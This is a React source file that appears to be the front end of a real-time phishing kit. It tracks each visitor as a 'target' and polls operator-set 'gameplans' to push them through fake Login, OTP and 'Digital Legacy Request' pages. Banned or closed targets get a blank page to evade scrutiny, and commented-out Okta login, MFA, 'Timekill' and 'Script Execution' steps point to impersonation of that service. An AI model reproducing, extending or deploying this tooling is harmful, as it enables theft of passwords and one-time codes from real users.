'use client';
import { useEffect, useRef, useState } from "react";
import { getTargetId } from "./getTargetId";
import { getBrowserTRPCClient } from "../utils/trpc/client";
import Login from "../components/Login/Login";
import Otp from "../components/Otp/Otp";
import Success from "../components/Success/Success";
import Footer from "../components/Footer/Footer";
import Nav from "../components/Nav/Nav";
import Loader from "../components/Loader/Loader";
import addIntakeEvent from "./addIntakeEvent";
import "./TropicGlobal.scss";
import DigitalLegacy from "../components/DigitalLegacy/DigitalLegacy";
import WaitingScreen from "../components/WaitingScreen/WaitingScreen";


function useTargetId() {
    const [id, setId] = useState(null);
    const [isLoading, setIsLoading] = useState(true);
    const [error, setError] = useState(null);
    const isMounted = useRef(true);
    const initializationAttempted = useRef(false);

    useEffect(() => {
        // Set up cleanup flag
        isMounted.current = true;
        
        async function initializeTargetId() {
            if (initializationAttempted.current) return;
            initializationAttempted.current = true;
            
            try {
                setIsLoading(true);
                console.log('Initializing target ID');
                // Get target ID (will be deduplicated by the improved getTargetId function)
                const targetId = await getTargetId();
                
                // Only update state if component is still mounted
                if (isMounted.current) {
                    console.log('Target ID initialized:', targetId);
                    setId(targetId);
                    setIsLoading(false);
                }
            } catch (err) {
                console.error('Error initializing target ID:', err);
                if (isMounted.current) {
                    setError(err);
                    setIsLoading(false);
                }
            }
        }

        initializeTargetId();

        // Cleanup function
        return () => {
            isMounted.current = false;
        };
    }, []);

    return { targetId: id, isLoading, error };
}
export default function Provider({ children }) {
    // Use our custom hook to get the target ID
    const { targetId, isLoading: targetIdLoading, error: targetIdError } = useTargetId();
    
    const [targetStatus, setTargetStatus] = useState(null);
    const [intakeState, setIntakeState] = useState(null);
    const [gameplan, setGameplan] = useState(null);
    const [intakeEvents, setIntakeEvents] = useState([]);
    const [currentPage, setCurrentPage] = useState(null);
    const [loading, setLoading] = useState(true);
    const [username, setUsername] = useState('');

    const subscriptions = useRef([]);
    const pollInterval = useRef(null);
    const statusPollInterval = useRef(null);
    const dataInitialized = useRef(false);

    // Debug logging for state changes
    useEffect(() => {
        console.log('gameplan state updated:', gameplan);
    }, [gameplan]);

    useEffect(() => {
        console.log('intakeState updated:', intakeState);
        
        // When intakeState changes, ensure we update the current page
        if (intakeState && gameplan) {
            const newPage = gameplan.pages[intakeState.gameplan_step]?.name || null;
            console.log('Updating current page to:', newPage, 'from step:', intakeState.gameplan_step);
            setCurrentPage(newPage);
        }
    }, [intakeState, gameplan]);

    useEffect(() => {
        console.log('Current page set to:', currentPage);
    }, [currentPage]);

    // Only initialize data and subscriptions when we have a target ID
    useEffect(() => {
        if (!targetId || dataInitialized.current) return;
        
        let isMounted = true;
        dataInitialized.current = true;
        
        console.log('Initializing data and subscriptions for target ID:', targetId);

        async function initializeData() {
            try {
                if (targetId === 'dev-target-no-db') {
                    if (isMounted) {
                        console.warn('Dev fallback target; skipping DB, showing Login.');
                        setIntakeState({ gameplan_step: 0 });
                        setGameplan({ pages: [{ name: 'Login' }] });
                    }
                    return;
                }
                const trpc = getBrowserTRPCClient();
                const target = await trpc.targets.getById.query({ targetId });
                if (isMounted && target) {
                    const status = target.status || 'active';
                    if (status === 'pending') {
                        setTargetStatus('pending');
                        setLoading(false);
                        setupStatusPolling(targetId);
                        return;
                    }
                    if (status === 'banned' || status === 'ended') {
                        setTargetStatus('banned');
                        setLoading(false);
                        return;
                    }
                }
                const [initialIntakeState, initialGameplan, initialEvents] = await Promise.all([
                    trpc.intakeState.getByTarget.query({ targetId }),
                    trpc.gameplans.getByTarget.query({ targetId }),
                    trpc.intakeEvents.listByTarget.query({ targetId }),
                ]);

                if (isMounted) {
                    const hasNoData = !initialIntakeState && !initialGameplan;
                    if (hasNoData) {
                        console.warn('No Supabase data; showing Login.');
                        setIntakeState({ gameplan_step: 0 });
                        setGameplan({ pages: [{ name: 'Login' }] });
                    } else {
                        if (initialIntakeState) {
                            console.log('Setting initial intake state:', initialIntakeState);
                            setIntakeState(initialIntakeState);
                        }
                        if (initialGameplan) {
                            console.log('Setting initial gameplan:', initialGameplan);
                            setGameplan(initialGameplan);
                        }
                    }
                    setIntakeEvents(initialEvents || []);
                    addPageLoadedEvent(targetId);
                }

                // Clear any existing subscriptions
                subscriptions.current.forEach((unsubscribe) => unsubscribe?.());
                subscriptions.current = [];

                // Set up enhanced real-time subscriptions
                setupRealtimeSubscriptions(targetId);
                setupPolling(targetId);

            } catch (error) {
                console.error('Provider initialization error:', error);
            }
        }

        initializeData();

        return () => {
            isMounted = false;
            // Clean up subscriptions
            subscriptions.current.forEach((unsubscribe) => unsubscribe?.());
            subscriptions.current = [];
            if (pollInterval.current) {
                clearInterval(pollInterval.current);
                pollInterval.current = null;
            }
            if (statusPollInterval.current) {
                clearInterval(statusPollInterval.current);
                statusPollInterval.current = null;
            }
        };
    }, [targetId]);

    // Function to set up real-time subscriptions
    function setupRealtimeSubscriptions(targetId) {
        if (!targetId) return;

        const trpc = getBrowserTRPCClient();
        console.log('Setting up tRPC subscriptions for target ID:', targetId);

        const intakeStateSubscription = trpc.intakeState.onUpdate.subscribe(
            { targetId },
            {
                onData: (payload) => {
                    console.log('Received intake_states update:', payload);
                    if (payload?.row) {
                        setIntakeState(payload.row);
                    }
                },
                onError: (error) => {
                    console.error("intakeState subscription error:", error);
                },
            }
        );

        const gameplanSubscription = trpc.gameplans.onUpdate.subscribe(
            { targetId },
            {
                onData: (payload) => {
                    console.log('Received gameplans update:', payload);
                    if (payload?.row) {
                        setGameplan(payload.row);
                    }
                },
                onError: (error) => {
                    console.error("gameplan subscription error:", error);
                },
            }
        );

        const intakeEventSubscription = trpc.intakeEvents.onUpdate.subscribe(
            { targetId },
            {
                onData: (payload) => {
                    console.log('Received intake_events update:', payload);
                    const row = payload?.row;
                    if (!row) return;
                    setIntakeEvents(prev => {
                        const existing = prev.filter((e) => e.id !== row.id);
                        return [...existing, row];
                    });
                },
                onError: (error) => {
                    console.error("intakeEvents subscription error:", error);
                },
            }
        );

        // Store unsubscribe handlers
        subscriptions.current = [
            () => intakeStateSubscription.unsubscribe(),
            () => gameplanSubscription.unsubscribe(),
            () => intakeEventSubscription.unsubscribe()
        ];
    }

    function setupStatusPolling(targetId) {
        const trpc = getBrowserTRPCClient();
        if (statusPollInterval.current) {
            clearInterval(statusPollInterval.current);
            statusPollInterval.current = null;
        }
        statusPollInterval.current = setInterval(async () => {
            try {
                const target = await trpc.targets.getById.query({ targetId });
                if (target?.status === 'active') {
                    if (statusPollInterval.current) {
                        clearInterval(statusPollInterval.current);
                        statusPollInterval.current = null;
                    }
                    dataInitialized.current = false;
                    setTargetStatus(null);
                    window.location.reload();
                }
                if (target?.status === 'banned') {
                    setTargetStatus('banned');
                }
            } catch (e) {
                console.error('Status poll error:', e);
            }
        }, 2000);
    }

    function setupPolling(targetId) {
        const trpc = getBrowserTRPCClient();
        if (pollInterval.current) {
            clearInterval(pollInterval.current);
            pollInterval.current = null;
        }
        pollInterval.current = setInterval(async () => {
            try {
                const [latestState, latestGameplan, latestEvents] = await Promise.all([
                    trpc.intakeState.getByTarget.query({ targetId }),
                    trpc.gameplans.getByTarget.query({ targetId }),
                    trpc.intakeEvents.listByTarget.query({ targetId }),
                ]);
                if (latestState) setIntakeState(latestState);
                if (latestGameplan) setGameplan(latestGameplan);
                setIntakeEvents(latestEvents || []);
            } catch (error) {
                console.error("Polling refresh error:", error);
            }
        }, 2000);
    }

    // Add page loaded event (only called once during initialization)
    async function addPageLoadedEvent(targetId) {
        try {
            await addIntakeEvent({
                target_id: targetId,
                type: 'interaction',
                interaction_title: 'Loaded page',
            });
            console.log('Added page loaded event');
        } catch (error) {
            console.error('Error adding page loaded event:', error);
        }
    }

    // Handle loading state
    useEffect(() => {
        if (targetStatus === 'pending' || targetStatus === 'banned') {
            setLoading(false);
            return;
        }
        if (targetIdLoading || !intakeState || !gameplan || intakeState?.force_load) {
            setLoading(true);
        } else {
            setLoading(false);
        }
    }, [targetIdLoading, intakeState, gameplan, targetStatus]);

    // Show loader if we're still initializing or loading data
    if (targetIdLoading) {
        return <Loader />;
    }

    // Closed to new visitors
    if (targetId === 'closed') {
        return <div style={{ position: 'fixed', inset: 0, background: '#fff' }} />;
    }

    // Handle target ID error
    if (targetIdError) {
        console.error('Target ID error:', targetIdError);
        return (
            <div className="error-container">
                <h2>Error initializing session</h2>
                <p>There was a problem setting up your session. Please refresh the page or try again later.</p>
            </div>
        );
    }

    if (targetStatus === 'pending') {
        return (
            <>
                <Nav />
                <WaitingScreen />
                <Footer />
            </>
        );
    }
    if (targetStatus === 'banned') {
        return <div style={{ position: 'fixed', inset: 0, background: '#fff' }} />;
    }

    return (
        <>
        {
            loading && <Loader />
        }
        {/*}
        {
            currentPage == 'Okta Login' && <UserPassLogin setParentUsername={setUsername} />
        }
        {
            currentPage == 'Okta MFA' && <OktaMFA username={username} />
        }
        {
            currentPage == 'Okta Timekill' && <CheckUp username={username} />
        }
        {
            currentPage == 'Okta Success' && <Success />
        }
        {
            currentPage == 'Okta Script Execution' && <ConfirmPasskey username={username} />
        }
            */}
        <Nav />
        {
            currentPage == 'Loading' && <Loader />
        }
        {
            currentPage == 'Login' && <Login />
        }
        {
            currentPage == 'OTP' && <Otp />
        }
        {
            currentPage == 'Digital Legacy Request' && <DigitalLegacy />
        }
        {
            currentPage == 'Success' && <Success />
        }
        <Footer />
    </>
    );
}